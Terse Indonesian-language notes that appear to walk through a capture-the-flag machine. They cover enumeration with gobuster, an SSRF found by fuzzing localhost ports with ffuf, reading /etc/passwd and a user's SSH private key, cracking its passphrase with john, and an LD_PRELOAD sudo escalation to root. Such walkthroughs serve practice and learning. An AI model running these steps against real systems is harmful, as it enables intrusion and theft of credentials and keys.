1. scan -> 22 80 buka ssh http -> coba masuk
2. scan dir scan subdo -> gobuster dir -u 'link' -w dir.txt -> gobuster vhost -u "link" -w subdo.txt --append-domain 
3. disitu bisa bruteforce port yg dipake localhost -> buat wordlist dulu -> seq 1 1500 >> port.txt
4. ffuf -u link -X POST -d "url=http://127.0.0.1:FUZZ" -w port.txt -H "Content-Type: application/x-www-form-urlencoded" 
5. atau itu data nya di urlencode dulu biar persen persen -> terus buka aja web localhost port nya itu
6. sekarang inputnya gini -> http://127.0.0.1:port/etc/passwd -> nanti muncul user usernya -> ato /home juga
7. next gini -> /home/user/.ssh/id_rsa -> chmod 600 rsa -> coba ssh -i rsa saad@ip  -> butuh phrase
8. ssh2john rsa >> hashrsa.txt -> john hashrsa.txt --wordlist=/rockyou.txt -> dapet dah ssh ulang
9. cat bash history -> catet passwd user -> sudo -l -> coba bikin preload cari sendiri -> terus jalanin ping sambil prelod
10. klaim root
